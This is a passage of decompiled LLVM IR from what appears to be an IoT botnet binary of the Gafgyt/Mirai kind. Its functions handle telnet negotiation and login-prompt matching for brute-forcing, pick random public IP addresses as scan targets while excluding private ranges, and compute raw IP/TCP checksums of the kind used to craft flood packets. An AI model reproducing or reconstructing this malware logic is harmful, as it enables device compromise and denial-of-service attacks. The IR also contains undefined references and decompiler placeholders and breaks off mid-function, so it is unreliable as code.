  br i1 %tmp33, label %dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge.dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge_crit_edge, label %dec_label_pc_10002be0

dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge.dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge_crit_edge: ; preds = %dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge
  %v3_10002bb4.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge

dec_label_pc_10002be0:                            ; preds = %dec_label_pc_10002bb0.dec_label_pc_10002bb0_crit_edge
  store i32 %v1_10002be4, i32* %r10.global-to-local, align 4
  %v2_10002bfc = load i32, i32* %v1_10002bfc, align 4
  %v2_10002c10 = or i32 %v2_10002bfc, %v3_10002c0c
  store i32 %v2_10002c10, i32* %v1_10002bfc, align 4
  store i32 268446800, i32* @lr, align 4
  %v5_10002c4c = call i32 @__libc_select(i32 %v1_10002c2c, i32 %v2_10002b9c, i32 0, i32 0, i32 %v2_10002c34)
  %tmp34 = icmp slt i32 %v5_10002c4c, 1
  br i1 %tmp34, label %dec_label_pc_10002de4, label %dec_label_pc_10002c5c

dec_label_pc_10002c5c:                            ; preds = %dec_label_pc_10002be0
  %v2_10002c68 = add i32 %stack_var_-196.09, %arg6
  store i32 268446852, i32* @lr, align 4
  %v5_10002c80 = call i32 @__libc_recv(i32 %arg1, i32 %v2_10002c68, i32 1, i32 0, i32 %stack_var_-196.09)
  %v4_10002c94 = icmp eq i32 %v5_10002c80, -1
  br i1 %v4_10002c94, label %dec_label_pc_10002ca8, label %dec_label_pc_10002c9c

dec_label_pc_10002c9c:                            ; preds = %dec_label_pc_10002c5c
  %v3_10002ca0 = icmp eq i32 %v5_10002c80, 0
  br i1 %v3_10002ca0, label %dec_label_pc_10002ca8, label %dec_label_pc_10002cb4

dec_label_pc_10002ca8:                            ; preds = %dec_label_pc_10002c9c, %dec_label_pc_10002c5c
  br label %dec_label_pc_10002dec

dec_label_pc_10002cb4:                            ; preds = %dec_label_pc_10002c9c
  %v2_10002cbc = add i32 %v5_10002c80, %stack_var_-196.09
  %v4_10002cc4 = inttoptr i32 %v2_10002c68 to i8*
  %v3_10002cc8 = load i8, i8* %v4_10002cc4, align 1
  %v3_10002cd0 = icmp eq i8 %v3_10002cc8, -1
  br i1 %v3_10002cd0, label %dec_label_pc_10002cd8, label %dec_label_pc_10002d5c

dec_label_pc_10002cd8:                            ; preds = %dec_label_pc_10002cb4
  %v1_10002cdc = add i32 %v2_10002c68, 1
  store i32 268446964, i32* @lr, align 4
  %v5_10002cf0 = call i32 @__libc_recv(i32 %arg1, i32 %v1_10002cdc, i32 2, i32 0, i32 %v2_10002c68)
  %v4_10002d04 = icmp eq i32 %v5_10002cf0, -1
  br i1 %v4_10002d04, label %dec_label_pc_10002d18, label %dec_label_pc_10002d0c

dec_label_pc_10002d0c:                            ; preds = %dec_label_pc_10002cd8
  %v3_10002d10 = icmp eq i32 %v5_10002cf0, 0
  br i1 %v3_10002d10, label %dec_label_pc_10002d18, label %dec_label_pc_10002d24

dec_label_pc_10002d18:                            ; preds = %dec_label_pc_10002d0c, %dec_label_pc_10002cd8
  br label %dec_label_pc_10002dec

dec_label_pc_10002d24:                            ; preds = %dec_label_pc_10002d0c
  %v2_10002d2c = add i32 %v5_10002cf0, %v2_10002cbc
  store i32 268447044, i32* @lr, align 4
  %v4_10002d40 = call i32 @negotiate(i32 %arg1, i32 %v2_10002c68, i32 3, i32 %v2_10002cbc)
  %v3_10002d48 = icmp eq i32 %v4_10002d40, 0
  br i1 %v3_10002d48, label %dec_label_pc_10002d50, label %dec_label_pc_10002da0.backedge

dec_label_pc_10002d50:                            ; preds = %dec_label_pc_10002d24
  br label %dec_label_pc_10002dec

dec_label_pc_10002d5c:                            ; preds = %dec_label_pc_10002cb4
  store i32 268447080, i32* @lr, align 4
  %v5_10002d64 = call i32 @strstr(i32 %arg6, i8* %v4_10002d64, i32 %v2_10002c68)
  %v3_10002d6c = icmp eq i32 %v5_10002d64, 0
  br i1 %v3_10002d6c, label %dec_label_pc_10002d74, label %dec_label_pc_10002dd8

dec_label_pc_10002d74:                            ; preds = %dec_label_pc_10002d5c
  br i1 %v3_10002d78, label %dec_label_pc_10002da0.backedge, label %dec_label_pc_10002d80

dec_label_pc_10002da0.backedge:                   ; preds = %dec_label_pc_10002d74, %dec_label_pc_10002d80, %dec_label_pc_10002d24
  %stack_var_-196.0.be = phi i32 [ %v2_10002d2c, %dec_label_pc_10002d24 ], [ %v2_10002cbc, %dec_label_pc_10002d74 ], [ %v2_10002cbc, %dec_label_pc_10002d80 ]
  %v1_10002da4 = add i32 %stack_var_-196.0.be, 2
  %v2_10002dac = icmp slt i32 %v1_10002da4, %arg7
  br i1 %v2_10002dac, label %dec_label_pc_10002da0.backedge.dec_label_pc_10002db4_crit_edge, label %dec_label_pc_10002de4

dec_label_pc_10002da0.backedge.dec_label_pc_10002db4_crit_edge: ; preds = %dec_label_pc_10002da0.backedge
  %v3_10002db4.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_10002db4

dec_label_pc_10002d80:                            ; preds = %dec_label_pc_10002d74
  %v1_10002d84 = call i32 @matchPrompt(i32 %arg6)
  %v3_10002d8c = icmp eq i32 %v1_10002d84, 0
  br i1 %v3_10002d8c, label %dec_label_pc_10002da0.backedge, label %dec_label_pc_10002dd8

dec_label_pc_10002db4:                            ; preds = %dec_label_pc_10002da0.backedge.dec_label_pc_10002db4_crit_edge, %dec_label_pc_10002db4.lr.ph
  %v3_10002db4 = phi i32 [ %arg4, %dec_label_pc_10002db4.lr.ph ], [ %v3_10002db4.pre, %dec_label_pc_10002da0.backedge.dec_label_pc_10002db4_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_10002b64, %dec_label_pc_10002db4.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_10002da0.backedge.dec_label_pc_10002db4_crit_edge ]
  %v2_10002db8 = icmp sgt i32 %v3_10002db4, 0
  br i1 %v2_10002db8, label %dec_label_pc_10002b9c, label %dec_label_pc_10002dc0

dec_label_pc_10002dc0:                            ; preds = %dec_label_pc_10002db4
  br i1 %v2_10002dc4, label %dec_label_pc_10002b9c, label %dec_label_pc_10002de4

dec_label_pc_10002dd8:                            ; preds = %dec_label_pc_10002d5c, %dec_label_pc_10002d80
  br label %dec_label_pc_10002dec

dec_label_pc_10002de4:                            ; preds = %dec_label_pc_10002da0.backedge, %dec_label_pc_10002dc0, %dec_label_pc_10002be0, %entry
  br label %dec_label_pc_10002dec

dec_label_pc_10002dec:                            ; preds = %dec_label_pc_10002dd8, %dec_label_pc_10002d50, %dec_label_pc_10002d18, %dec_label_pc_10002ca8, %dec_label_pc_10002de4
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_10002de4 ], [ 1, %dec_label_pc_10002dd8 ], [ 0, %dec_label_pc_10002ca8 ], [ 0, %dec_label_pc_10002d18 ], [ 0, %dec_label_pc_10002d50 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 2, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_10002cbc, { 1, 2, 3, 0 }
  uselistorder i32 %v2_10002c68, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_10002bcc, { 1, 0 }
  uselistorder i32 %v1_10002be4, { 1, 0 }
  uselistorder i32 %v2_10002b9c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_10002dec, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10002de4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10002dd8, { 1, 0 }
  uselistorder label %dec_label_pc_10002da0.backedge, { 1, 0, 2 }
}

define i32 @getRandomPublicIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 268447276, i32* @lr, align 4
  %v0_10002e28 = call i32 @random()
  %v2_10002e48 = srem i32 %v0_10002e28, 253
  %v6_10002e68 = trunc i32 %v2_10002e48 to i8
  store i32 268447344, i32* @lr, align 4
  %v0_10002e6c = call i32 @random()
  %v2_10002e8c = srem i32 %v0_10002e6c, 255
  %v1_10002eac = trunc i32 %v2_10002e8c to i8
  store i32 268447412, i32* @lr, align 4
  %v0_10002eb0 = call i32 @random()
  %v2_10002ed0 = srem i32 %v0_10002eb0, 255
  %v1_10002ef0 = trunc i32 %v2_10002ed0 to i8
  store i32 268447480, i32* @lr, align 4
  %v0_10002ef4 = call i32 @random()
  br label %dec_label_pc_1000304c

dec_label_pc_10002f3c:                            ; preds = %dec_label_pc_100030f0, %dec_label_pc_10003210, %dec_label_pc_10003200, %dec_label_pc_100031d0, %dec_label_pc_100031a0, %dec_label_pc_10003190, %dec_label_pc_10003170, %dec_label_pc_10003150, %dec_label_pc_10003120, %dec_label_pc_100030c0, %dec_label_pc_100030a0, %dec_label_pc_1000308c, %dec_label_pc_1000305c, %dec_label_pc_1000304c
  store i32 268447552, i32* @lr, align 4
  %v0_10002f3c = call i32 @random()
  %v2_10002f5c = srem i32 %v0_10002f3c, 253
  %v6_10002f7c = trunc i32 %v2_10002f5c to i8
  store i32 268447620, i32* @lr, align 4
  %v0_10002f80 = call i32 @random()
  %v2_10002fa0 = srem i32 %v0_10002f80, 255
  %v1_10002fc0 = trunc i32 %v2_10002fa0 to i8
  store i32 268447688, i32* @lr, align 4
  %v0_10002fc4 = call i32 @random()
  %v2_10002fe4 = srem i32 %v0_10002fc4, 255
  %v1_10003004 = trunc i32 %v2_10002fe4 to i8
  store i32 268447756, i32* @lr, align 4
  %v0_10003008 = call i32 @random()
  br label %dec_label_pc_1000304c

dec_label_pc_1000304c:                            ; preds = %entry, %dec_label_pc_10002f3c
  %storemerge.in = phi i32 [ %v0_10002ef4, %entry ], [ %v0_10003008, %dec_label_pc_10002f3c ]
  %stack_var_-70.0 = phi i8 [ %v1_10002ef0, %entry ], [ %v1_10003004, %dec_label_pc_10002f3c ]
  %stack_var_-71.0 = phi i8 [ %v1_10002eac, %entry ], [ %v1_10002fc0, %dec_label_pc_10002f3c ]
  %stack_var_-72.0 = phi i8 [ %v6_10002e68, %entry ], [ %v6_10002f7c, %dec_label_pc_10002f3c ]
  %storemerge = srem i32 %storemerge.in, 255
  %v4_1000304c2 = zext i8 %stack_var_-72.0 to i32
  %v3_10003054 = icmp eq i8 %stack_var_-72.0, 0
  br i1 %v3_10003054, label %dec_label_pc_10002f3c, label %dec_label_pc_1000305c

dec_label_pc_1000305c:                            ; preds = %dec_label_pc_1000304c
  %v3_10003064 = icmp eq i8 %stack_var_-72.0, 10
  br i1 %v3_10003064, label %dec_label_pc_10002f3c, label %dec_label_pc_1000306c

dec_label_pc_1000306c:                            ; preds = %dec_label_pc_1000305c
  %v3_10003074 = icmp eq i8 %stack_var_-72.0, 100
  br i1 %v3_10003074, label %dec_label_pc_1000307c, label %dec_label_pc_100030a0

dec_label_pc_1000307c:                            ; preds = %dec_label_pc_1000306c
  %tmp45 = icmp ult i8 %stack_var_-71.0, 64
  br i1 %tmp45, label %dec_label_pc_100030a0, label %dec_label_pc_1000308c

dec_label_pc_1000308c:                            ; preds = %dec_label_pc_1000307c
  %tmp46 = icmp sgt i8 %stack_var_-71.0, -1
  br i1 %tmp46, label %dec_label_pc_10002f3c, label %dec_label_pc_100030a0

dec_label_pc_100030a0:                            ; preds = %dec_label_pc_1000306c, %dec_label_pc_1000308c, %dec_label_pc_1000307c
  %v3_100030a8 = icmp eq i8 %stack_var_-72.0, 127
  br i1 %v3_100030a8, label %dec_label_pc_10002f3c, label %dec_label_pc_100030b0

dec_label_pc_100030b0:                            ; preds = %dec_label_pc_100030a0
  %v3_100030b8 = icmp eq i8 %stack_var_-72.0, -87
  br i1 %v3_100030b8, label %dec_label_pc_100030c0, label %dec_label_pc_100030d0

dec_label_pc_100030c0:                            ; preds = %dec_label_pc_100030b0
  %v3_100030c8 = icmp eq i8 %stack_var_-71.0, -2
  br i1 %v3_100030c8, label %dec_label_pc_10002f3c, label %dec_label_pc_100030d0

dec_label_pc_100030d0:                            ; preds = %dec_label_pc_100030b0, %dec_label_pc_100030c0
  %v3_100030d8 = icmp eq i8 %stack_var_-72.0, -84
  br i1 %v3_100030d8, label %dec_label_pc_100030e0, label %dec_label_pc_10003100

dec_label_pc_100030e0:                            ; preds = %dec_label_pc_100030d0
  %v2_100030e8 = icmp ugt i8 %stack_var_-71.0, 16
  br i1 %v2_100030e8, label %dec_label_pc_10003100, label %dec_label_pc_100030f0

dec_label_pc_100030f0:                            ; preds = %dec_label_pc_100030e0
  br label %dec_label_pc_10002f3c

dec_label_pc_10003100:                            ; preds = %dec_label_pc_100030d0, %dec_label_pc_100030e0
  %v3_10003108 = icmp eq i8 %stack_var_-72.0, -64
  br i1 %v3_10003108, label %dec_label_pc_10003110, label %dec_label_pc_10003160

dec_label_pc_10003110:                            ; preds = %dec_label_pc_10003100
  %v3_10003118 = icmp eq i8 %stack_var_-71.0, 0
  br i1 %v3_10003118, label %dec_label_pc_10003120, label %dec_label_pc_10003140

dec_label_pc_10003120:                            ; preds = %dec_label_pc_10003110
  %v3_10003128 = icmp eq i8 %stack_var_-70.0, 2
  br i1 %v3_10003128, label %dec_label_pc_10002f3c, label %dec_label_pc_10003140

dec_label_pc_10003140:                            ; preds = %dec_label_pc_10003110, %dec_label_pc_10003120
  %v3_10003148 = icmp eq i8 %stack_var_-71.0, 88
  br i1 %v3_10003148, label %dec_label_pc_10003150, label %dec_label_pc_10003170

dec_label_pc_10003150:                            ; preds = %dec_label_pc_10003140
  %v3_10003158 = icmp eq i8 %stack_var_-70.0, 99
  br i1 %v3_10003158, label %dec_label_pc_10002f3c, label %dec_label_pc_10003170

dec_label_pc_10003160:                            ; preds = %dec_label_pc_10003100
  br label %dec_label_pc_10003180

dec_label_pc_10003170:                            ; preds = %dec_label_pc_10003140, %dec_label_pc_10003150
  %v3_10003178 = icmp eq i8 %stack_var_-71.0, -88
  br i1 %v3_10003178, label %dec_label_pc_10002f3c, label %dec_label_pc_10003180

dec_label_pc_10003180:                            ; preds = %dec_label_pc_10003160, %dec_label_pc_10003170
  %v3_10003188 = icmp eq i8 %stack_var_-72.0, -58
  br i1 %v3_10003188, label %dec_label_pc_10003190, label %dec_label_pc_100031b0

dec_label_pc_10003190:                            ; preds = %dec_label_pc_10003180
  %v3_10003198 = icmp eq i8 %stack_var_-71.0, 18
  br i1 %v3_10003198, label %dec_label_pc_10002f3c, label %dec_label_pc_100031a0

dec_label_pc_100031a0:                            ; preds = %dec_label_pc_10003190
  %v3_100031a8 = icmp eq i8 %stack_var_-71.0, 19
  br i1 %v3_100031a8, label %dec_label_pc_10002f3c, label %dec_label_pc_100031c0

dec_label_pc_100031b0:                            ; preds = %dec_label_pc_10003180
  br label %dec_label_pc_100031e0

dec_label_pc_100031c0:                            ; preds = %dec_label_pc_100031a0
  %v3_100031c8 = icmp eq i8 %stack_var_-71.0, 51
  br i1 %v3_100031c8, label %dec_label_pc_100031d0, label %dec_label_pc_100031e0

dec_label_pc_100031d0:                            ; preds = %dec_label_pc_100031c0
  %v3_100031d8 = icmp eq i8 %stack_var_-70.0, 100
  br i1 %v3_100031d8, label %dec_label_pc_10002f3c, label %dec_label_pc_100031e0

dec_label_pc_100031e0:                            ; preds = %dec_label_pc_100031b0, %dec_label_pc_100031c0, %dec_label_pc_100031d0
  %v3_100031e8 = icmp eq i8 %stack_var_-72.0, -53
  br i1 %v3_100031e8, label %dec_label_pc_100031f0, label %dec_label_pc_10003210

dec_label_pc_100031f0:                            ; preds = %dec_label_pc_100031e0
  %v3_100031f8 = icmp eq i8 %stack_var_-71.0, 0
  br i1 %v3_100031f8, label %dec_label_pc_10003200, label %dec_label_pc_10003210

dec_label_pc_10003200:                            ; preds = %dec_label_pc_100031f0
  %v3_10003208 = icmp eq i8 %stack_var_-70.0, 113
  br i1 %v3_10003208, label %dec_label_pc_10002f3c, label %dec_label_pc_10003210

dec_label_pc_10003210:                            ; preds = %dec_label_pc_100031f0, %dec_label_pc_100031e0, %dec_label_pc_10003200
  %v2_10003218 = icmp ugt i8 %stack_var_-72.0, -33
  br i1 %v2_10003218, label %dec_label_pc_10002f3c, label %dec_label_pc_10003220

dec_label_pc_10003220:                            ; preds = %dec_label_pc_10003210
  store i32 0, i32* %stack_var_-68, align 4
  %v2_10003240 = ptrtoint i32* %stack_var_-68 to i32
  %v4_10003250 = zext i8 %stack_var_-71.0 to i32
  %v4_1000325c = zext i8 %stack_var_-70.0 to i32
  %v4_10003268 = urem i32 %storemerge, 256
  %v12_10003290 = call i32 @zprintf(i32 %v2_10003240, i32 ptrtoint ([12 x i8]* @global_var_1000e28c.47 to i32), i32 %v4_1000304c2, i32 %v4_10003250, i32 %v4_1000325c, i32 %v4_10003268, i32 268500992, i32 0, i32 0, i32 0, i32 0)
  store i32 268448416, i32* @lr, align 4
  %v1_1000329c = call i32 @inet_addr(i32 %v2_10003240)
  ret i32 %v1_1000329c

; uselistorder directives
  uselistorder i32 %v2_10003240, { 1, 0 }
  uselistorder i8 %stack_var_-72.0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i8 %stack_var_-71.0, { 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1, 11 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i8 -2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10003210, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100031e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003180, { 1, 0 }
  uselistorder label %dec_label_pc_10003170, { 1, 0 }
  uselistorder label %dec_label_pc_10003140, { 1, 0 }
  uselistorder label %dec_label_pc_10003100, { 1, 0 }
  uselistorder label %dec_label_pc_100030d0, { 1, 0 }
  uselistorder label %dec_label_pc_100030a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000304c, { 1, 0 }
  uselistorder label %dec_label_pc_10002f3c, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13 }
}

define i32 @getRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100032dc = load i32, i32* @global_var_1001fdb8.48, align 4
  store i32 %v3_100032dc, i32* @r3, align 4
  %v2_100032e4 = call i32 @ntohl(i32 %v3_100032dc, i32 ptrtoint (i32* @global_var_10020000.2 to i32))
  %v2_100032f0 = and i32 %v2_100032e4, %arg1
  %v0_100032f8 = call i32 @rand_cmwc()
  %v1_10003304 = sub i32 -1, %arg1
  %v2_10003308 = and i32 %v0_100032f8, %v1_10003304
  %v2_10003310 = xor i32 %v2_10003308, %v2_100032f0
  ret i32 %v2_10003310
}

define i32 @csum(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp21 = call i16 @__decompiler_undefined_function_4()
  %v2_100033a03 = icmp sgt i32 %arg2, 1
  br i1 %v2_100033a03, label %dec_label_pc_10003358, label %dec_label_pc_100033a8

dec_label_pc_10003358:                            ; preds = %entry, %dec_label_pc_10003358
  %stack_var_-24.08 = phi i16* [ %v5_1000338c, %dec_label_pc_10003358 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v1_10003394, %dec_label_pc_10003358 ], [ %arg2, %entry ]
  %stack_var_-16.06 = phi i32 [ %v5_10003378, %dec_label_pc_10003358 ], [ 0, %entry ]
  %stack_var_-12.05 = phi i32 [ %v2_10003374, %dec_label_pc_10003358 ], [ 0, %entry ]
  %v4_10003358 = ptrtoint i16* %stack_var_-24.08 to i32
  %v2_1000335c = load i16, i16* %stack_var_-24.08, align 2
  %v3_1000335c = zext i16 %v2_1000335c to i32
  %v2_10003374 = add i32 %v3_1000335c, %stack_var_-12.05
  %v3_10003374 = icmp ult i32 %v2_10003374, %stack_var_-12.05
  %v4_10003378 = zext i1 %v3_10003374 to i32
  %v5_10003378 = add i32 %v4_10003378, %stack_var_-16.06
  %v1_10003388 = add i32 %v4_10003358, 2
  %v5_1000338c = inttoptr i32 %v1_10003388 to i16*
  %v1_10003394 = add nsw i32 %stack_var_-20.07, -2
  %v2_100033a0 = icmp sgt i32 %v1_10003394, 1
  br i1 %v2_100033a0, label %dec_label_pc_10003358, label %dec_label_pc_1000339c.dec_label_pc_100033a8_crit_edge

dec_label_pc_1000339c.dec_label_pc_100033a8_crit_edge: ; preds = %dec_label_pc_10003358
  %v3_100033a0.le = icmp eq i32 %v1_10003394, 1
  br i1 %v3_100033a0.le, label %dec_label_pc_100033b4, label %dec_label_pc_10003420.preheader

dec_label_pc_100033a8:                            ; preds = %entry
  %v3_100033a04 = icmp eq i32 %arg2, 1
  br i1 %v3_100033a04, label %dec_label_pc_100033b4, label %dec_label_pc_10003420.preheader

dec_label_pc_100033b4:                            ; preds = %dec_label_pc_1000339c.dec_label_pc_100033a8_crit_edge, %dec_label_pc_100033a8
  %stack_var_-24.0.lcssa20 = phi i16* [ %v5_1000338c, %dec_label_pc_1000339c.dec_label_pc_100033a8_crit_edge ], [ %arg1, %dec_label_pc_100033a8 ]
  %stack_var_-16.0.lcssa19 = phi i32 [ %v5_10003378, %dec_label_pc_1000339c.dec_label_pc_100033a8_crit_edge ], [ 0, %dec_label_pc_100033a8 ]
  %stack_var_-12.0.lcssa18 = phi i32 [ %v2_10003374, %dec_label_pc_1000339c.dec_label_pc_100033a8_crit_edge ], [ 0, %dec_label_pc_100033a8 ]
  %v1_100033b8 = bitcast i16* %stack_var_-24.0.lcssa20 to i8*
  %v2_100033b8 = load i8, i8* %v1_100033b8, align 1
  %v3_100033b8 = zext i8 %v2_100033b8 to i32
  %v2_100033d0 = add i32 %v3_100033b8, %stack_var_-12.0.lcssa18
  %v3_100033d0 = icmp ult i32 %v2_100033d0, %stack_var_-12.0.lcssa18
  %v4_100033d4 = zext i1 %v3_100033d0 to i32
  %v5_100033d4 = add i32 %v4_100033d4, %stack_var_-16.0.lcssa19
  br label %dec_label_pc_10003420.preheader

dec_label_pc_10003420.preheader:                  ; preds = %dec_label_pc_1000339c.dec_label_pc_100033a8_crit_edge, %dec_label_pc_100033b4, %dec_label_pc_100033a8
  %stack_var_-12.1.ph = phi i32 [ %v2_10003374, %dec_label_pc_1000339c.dec_label_pc_100033a8_crit_edge ], [ 0, %dec_label_pc_100033a8 ], [ %v2_100033d0, %dec_label_pc_100033b4 ]
  %stack_var_-16.1.ph = phi i32 [ %v5_10003378, %dec_label_pc_1000339c.dec_label_pc_100033a8_crit_edge ], [ 0, %dec_label_pc_100033a8 ], [ %v5_100033d4, %dec_label_pc_100033b4 ]
  %v1_1000342429 = mul i32 %stack_var_-16.1.ph, 65536
  %v1_1000342c30 = udiv i32 %stack_var_-12.1.ph, 65536
  %v2_1000343031 = or i32 %v1_1000342429, %v1_1000342c30
  %v1_1000343832 = udiv i32 %stack_var_-16.1.ph, 65536
  %v2_1000344033 = or i32 %v2_1000343031, %v1_1000343832
  %v3_1000344434 = icmp eq i32 %v2_1000344033, 0
  br i1 %v3_1000344434, label %dec_label_pc_1000344c, label %dec_label_pc_100033e4

dec_label_pc_100033e4:                            ; preds = %dec_label_pc_10003420.preheader, %dec_label_pc_100033e4
  %v1_1000343837 = phi i32 [ %v1_10003438, %dec_label_pc_100033e4 ], [ %v1_1000343832, %dec_label_pc_10003420.preheader ]
  %v2_1000343036 = phi i32 [ %v2_10003430, %dec_label_pc_100033e4 ], [ %v2_1000343031, %dec_label_pc_10003420.preheader ]
  %stack_var_-12.135 = phi i32 [ %v2_10003410, %dec_label_pc_100033e4 ], [ %stack_var_-12.1.ph, %dec_label_pc_10003420.preheader ]
  %v1_100033f0 = urem i32 %stack_var_-12.135, 65536
  %v2_10003410 = add i32 %v2_1000343036, %v1_100033f0
  %v3_10003410 = icmp ult i32 %v2_10003410, %v1_100033f0
  %v4_10003414 = zext i1 %v3_10003410 to i32
  %v5_10003414 = add nuw nsw i32 %v4_10003414, %v1_1000343837
  %v1_10003424 = mul i32 %v5_10003414, 65536
  %v1_1000342c = udiv i32 %v2_10003410, 65536
  %v2_10003430 = or i32 %v1_10003424, %v1_1000342c
  %v1_10003438 = udiv i32 %v5_10003414, 65536
  %v2_10003440 = or i32 %v2_10003430, %v1_10003438
  %v3_10003444 = icmp eq i32 %v2_10003440, 0
  br i1 %v3_10003444, label %dec_label_pc_10003420.dec_label_pc_1000344c_crit_edge, label %dec_label_pc_100033e4

dec_label_pc_10003420.dec_label_pc_1000344c_crit_edge: ; preds = %dec_label_pc_100033e4
  br label %dec_label_pc_1000344c

dec_label_pc_1000344c:                            ; preds = %dec_label_pc_10003420.dec_label_pc_1000344c_crit_edge, %dec_label_pc_10003420.preheader
  %v4_1000344c = zext i16 %tmp21 to i32
  %v1_10003458 = xor i32 %v4_1000344c, 65535
  ret i32 %v1_10003458

; uselistorder directives
  uselistorder i32 %v2_10003430, { 1, 0 }
  uselistorder i32 %v5_10003414, { 1, 0 }
  uselistorder i32 %v2_10003410, { 0, 2, 1 }
  uselistorder i32 %v1_1000343832, { 1, 0 }
  uselistorder i32 %stack_var_-16.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa18, { 1, 0 }
  uselistorder i32 %v1_10003394, { 0, 2, 1 }
  uselistorder i32 %v2_10003374, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-12.05, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100033e4, { 1, 0 }
  uselistorder label %dec_label_pc_10003420.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100033b4, { 1, 0 }
  uselistorder label %dec_label_pc_10003358, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10003470 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10003470, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_1000349c = add i32 %arg1, 12
  %v2_1000349c = inttoptr i32 %v1_1000349c to i32*
  %v3_1000349c = load i32, i32* %v2_1000349c, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_100034a8 = add i32 %arg1, 16
  %v2_100034a8 = inttoptr i32 %v1_100034a8 to i32*
  %v3_100034a8 = load i32, i32* %v2_100034a8, align 4
  store i32 20, i32* @r3, align 4
  %v1_100034c4 = call i32 @htons(i32 20)
  store i32 268448996, i32* @lr, align 4
  %v1_100034e0 = call i32 @malloc(i32 32)
  store i32 %v1_100034e0, i32* %r11.global-to-local, align 4
  store i32 %v3_100034a8, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10003500 = inttoptr i32 %v1_100034e0 to i32*
  store i32 %v3_1000349c, i32* %v2_10003500, align 4
  %v0_10003504 = load i32, i32* %r10.global-to-local, align 4
  %v1_10003504 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003504 = add i32 %v1_10003504, 4
  %v3_10003504 = inttoptr i32 %v2_10003504 to i32*
  store i32 %v0_10003504, i32* %v3_10003504, align 4
  %v0_10003508 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003508 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003508 = add i32 %v1_10003508, 8
  %v3_10003508 = inttoptr i32 %v2_10003508 to i32*
  store i32 %v0_10003508, i32* %v3_10003508, align 4
  %v1_10003510 = add i32 %v1_100034e0, 12
  store i32 %v1_10003510, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10003518 = load i32, i32* %arg2, align 4
  %v1_1000351c = add i32 %tmp, 4
  %v2_1000351c = inttoptr i32 %v1_1000351c to i32*
  %v3_1000351c = load i32, i32* %v2_1000351c, align 4
  store i32 %v3_1000351c, i32* %r10.global-to-local, align 4
  %v1_10003520 = add i32 %tmp, 8
  %v2_10003520 = inttoptr i32 %v1_10003520 to i32*
  %v3_10003520 = load i32, i32* %v2_10003520, align 4
  %v1_10003524 = add i32 %tmp, 12
  %v2_10003524 = inttoptr i32 %v1_10003524 to i32*
  %v3_10003524 = load i32, i32* %v2_10003524, align 4
  %v2_10003528 = inttoptr i32 %v1_10003510 to i32*
  store i32 %v2_10003518, i32* %v2_10003528, align 4
  %v0_1000352c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000352c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000352c = add i32 %v1_1000352c, 4
  %v3_1000352c = inttoptr i32 %v2_1000352c to i32*
  store i32 %v0_1000352c, i32* %v3_1000352c, align 4
  %v1_10003530 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003530 = add i32 %v1_10003530, 8
  %v3_10003530 = inttoptr i32 %v2_10003530 to i32*
